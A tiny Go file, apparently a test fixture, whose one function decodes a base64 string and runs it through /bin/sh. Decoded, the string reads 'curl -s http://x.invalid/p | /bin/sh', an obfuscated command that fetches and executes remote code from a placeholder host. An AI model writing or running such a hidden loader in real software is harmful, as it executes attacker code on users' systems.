package fixture

import (
	"encoding/base64"
	"os/exec"
)

func fixture() {
	decoded, _ := base64.StdEncoding.DecodeString("Y3VybCAtcyBodHRwOi8veC5pbnZhbGlkL3AgfCAvYmluL3No")
	_ = exec.Command("/bin/sh", "-c", string(decoded)).Run()
}
